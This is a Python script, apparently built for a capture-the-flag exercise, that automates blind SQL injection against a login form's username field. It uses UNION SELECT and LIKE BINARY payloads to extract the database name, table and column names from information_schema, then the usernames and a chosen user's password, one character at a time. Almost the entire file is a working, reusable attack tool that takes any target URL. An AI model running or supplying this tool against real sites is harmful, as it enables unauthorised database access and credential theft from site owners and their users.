"""
This script will enumerate a vulnerable target to identify database, table, column names, and passwords.

The "charset" value can be modified to any string you choose and the script will enumerate through it.

Contains some hardcoded logic, like expecting a 4 values for select. Need to adjust this. 
The reason is that this was made for a CTF where the database had this logic.
Could just add a function which determines the amount of columns for select.

Could be improved for handling network errors or unexpected results.
"""
import requests
import sys
import argparse

def enum_db(url, db_name="", table_name="", column_name="", column_enum="", username="", success_str="Welcome", username_col="username", enum_value=False, known_values=None, union_columns=4):
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _@.-!#$&*()[]{};:'\",?/~`^+=|\\"

    length = len(charset)
    i = 0
    char = ""
    print_text = ""
    sqli = ""
    union_column_string =  ",".join(str(i) for i in range(1, union_columns+1))

    if not db_name:
        sqli = f"' UNION SELECT {union_column_string} WHERE database() LIKE BINARY '"
        print_text = "Database name: "
    elif db_name and not table_name:
        sqli = f"' UNION SELECT {union_column_string} FROM information_schema.tables WHERE table_schema = '{db_name}' AND table_name LIKE BINARY '"
        print_text = "Table name: "
        print("")
    elif table_name and not column_name:
        sqli = f"' UNION SELECT {union_column_string} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' AND column_name LIKE BINARY '"
        print_text = "Column name: "
        print("")
    elif column_enum and not username:
        sqli = f"' UNION SELECT {union_column_string} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' {column_enum} '"
        print_text = "Column name: "
        print("")
    elif column_name and username and not enum_value:
        sqli = f"' UNION SELECT {union_column_string} FROM {table_name} WHERE {username_col}='{username}' AND {column_name} LIKE BINARY '"
        print_text = f"{username}'s Password: "
        print("")
    elif column_name and enum_value:
        excluded = ""
        for val in known_values:
            excluded += f" AND {column_name}!='{val}'"
        sqli = f"' UNION SELECT {union_column_string} FROM {table_name} WHERE 1=1 {excluded} AND {column_name} LIKE BINARY '"
        print_text = "Enumerated value: "
        print("")

    while i < length:
        data = {
            'username': sqli + char + charset[i] + "%' -- -",
            'password': 'a'
        }
        try:
            req = requests.post(url, data=data)
            if success_str in req.text:
                char = char + charset[i]
                i = 0
            else:
                sys.stdout.write(f"\r{print_text}{char}{charset[i]}")
                sys.stdout.flush()
                i += 1
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Request failed: {e}")
            exit(1)
    if char:
        sys.stdout.write(f"\r{print_text}{char} ")
        return char
    else:
        sys.stdout.write(f"\r{print_text}Failed to extract anything")
        return False

def get_database_name(url, success_str, union_columns):
    return enum_db(url, success_str=success_str, union_columns=union_columns)

def get_table_name(url, db_name, success_str,union_columns):
    return enum_db(url, db_name, success_str=success_str, union_columns=union_columns)

def get_column_name(url, db_name, table_name, success_str, union_columns):
    return enum_db(url, db_name, table_name, success_str=success_str, union_columns=union_columns)

def enumerate_additional_columns(url, db_name, table_name, initial_column, success_str,union_columns):
    column_list = [initial_column]
    while True:
        column_enum = ""
        for column in column_list:
            column_enum += f" AND column_name!='{column}'"
        column_enum += "AND column_name LIKE BINARY"
        new_column = enum_db(url, db_name, table_name, "a", column_enum, success_str=success_str, union_columns=union_columns)
        if new_column:
            column_list.append(new_column)
        else:
            break
    return column_list

def enumerate_column_values(url, db_name, table_name, column_name, success_str, union_columns):
    values = []
    while True:
        value = enum_db(
            url=url,
            db_name=db_name,
            table_name=table_name,
            column_name=column_name,
            success_str=success_str,
            enum_value=True,
            known_values=values,
            union_columns=union_columns
        )
        if value:
            values.append(value)
        else:
            break
    return values

def prompt_and_enumerate_password(url, db_name, table_name, column_list, success_str, union_columns):
    print("\nDiscovered columns:")
    for col in column_list:
        print(f"- {col}")

    username_col = input("\nEnter the column name that stores the username: ").strip()
    password_col = input("Enter the column name that stores the password: ").strip()

    if username_col not in column_list or password_col not in column_list:
        print("[!] Invalid column names. Make sure you entered names from the discovered list.")
        return

    print(f"\n[*] Enumerating values from column '{username_col}'...")
    usernames = enumerate_column_values(url, db_name, table_name, username_col, success_str, union_columns)

    if not usernames:
        print("[!] Could not find any usernames.")
        return

    print("\nFound usernames:")
    for u in usernames:
        print(f"- {u}")

    username = input(f"\nEnter one of the usernames above to extract the password: ").strip()
    if username not in usernames:
        print("[!] Username not in list.")
        return

    enum_db(
        url=url,
        db_name=db_name,
        table_name=table_name,
        column_name=password_col,
        column_enum="no enum",
        username=username,
        success_str=success_str,
        username_col=username_col,
        union_columns=union_columns
    )

def print_ascii():
    print(""" ____   ___  _     _   _____
/ ___| / _ \| |   (_) | ____|_ __  _   _ _ __ ___
\___ \| | | | |   | | |  _| | '_ \| | | | '_ ` _ \\
 ___) | |_| | |___| | | |___| | | | |_| | | | | | |
|____/ \__\_\_____|_| |_____|_| |_|\__,_|_| |_| |_|
            Blind SQLi Enumerator
          
          
""")

def main():
    parser = argparse.ArgumentParser(description="Blind SQLi enumerator for CTFs")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--success", help="Success string in response", default="Welcome", required=True)
    parser.add_argument("--columns", help="Number of columns for UNION SELECT", type=int, default=1, required=True)
    args = parser.parse_args()
    
    url = args.url
    success_str = args.success
    union_columns = args.columns

    print_ascii()

    db_name = get_database_name(url, success_str, union_columns)
    if db_name:
        table_name = get_table_name(url, db_name, success_str, union_columns)
        if table_name:
            column_name = get_column_name(url, db_name, table_name, success_str, union_columns)
            if column_name:
                columns = enumerate_additional_columns(url, db_name, table_name, column_name, success_str, union_columns)
                prompt_and_enumerate_password(url, db_name, table_name, columns, success_str, union_columns)



if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\tBye!\n")
